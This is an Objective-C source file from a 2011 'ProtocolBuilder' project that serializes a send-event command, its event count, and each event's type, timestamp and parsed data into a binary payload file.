//
//  SendEventPayloadBuilder.m
//  ProtocolBuilder
//
//  Created by Pichaya Srifar on 9/9/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "SendEventPayloadBuilder.h"
#import "CommandData.h"
#import "DataProvider.h"
#import "SendEvent.h"
#import "ProtocolParser.h"
#import "Event.h"

@implementation SendEventPayloadBuilder

+ (void) buildPayloadWithCommand:(SendEvent *)command withMetaData:(CommandMetaData *)metaData withPayloadFilePath:(NSString *)payloadFilePath withDirective:(TransportDirective)directive {
	if (!command) {
		return;
	}
	uint16_t cmdCode = [command getCommand];
	cmdCode = htons(cmdCode);
	uint16_t eventCount = [command eventCount];
	eventCount = htons(eventCount);
	
	NSError *error = nil;

	NSFileManager *fileMgr = [NSFileManager defaultManager];

	if ([fileMgr fileExistsAtPath:payloadFilePath]) {
		[fileMgr removeItemAtPath:payloadFilePath error:&error];
	}

	[fileMgr createFileAtPath:payloadFilePath contents:nil attributes:nil];

	NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:payloadFilePath];

	[fileHandle writeData:[NSData dataWithBytes:&cmdCode length:sizeof(cmdCode)]];
//	DLog(@"--> %@", [NSData dataWithContentsOfFile:payloadFilePath]);
	[fileHandle writeData:[NSData dataWithBytes:&eventCount length:sizeof(eventCount)]];
//	DLog(@"--> %@", [NSData dataWithContentsOfFile:payloadFilePath]);
	id provider = [command eventProvider];
	
	uint16_t eventType;
	NSString *timeStamp;
	id eventObj;
	
	while ([provider hasNext]) {
		DLog(@"hasNext");
		eventObj = [provider getObject];
		eventType = [eventObj getEventType];
		eventType = htons(eventType);
		timeStamp = [eventObj time];
		DLog (@"eventObject = %@", eventObj);
		DLog(@"eventType to data = %@", [NSData dataWithBytes:&eventType length:sizeof(eventType)]);
		
		[fileHandle writeData:[NSData dataWithBytes:&eventType length:sizeof(eventType)]];
		[fileHandle writeData:[timeStamp dataUsingEncoding:NSUTF8StringEncoding]]; // Fix size in the protocol 19 bytes
		DLog(@"!!!!! EVENT time stamp %@", timeStamp )
		//NSData *eventData = [ProtocolParser parseEvent:eventObj payloadFileHandle:fileHandle];
        NSData *eventData = [ProtocolParser parseEvent:eventObj metadata:metaData payloadFileHandle:fileHandle];
        
		[fileHandle writeData:eventData];
	}

	//DLog(@"dataWithContentsOfFile --> %@", [NSData dataWithContentsOfFile:payloadFilePath]);
}

@end
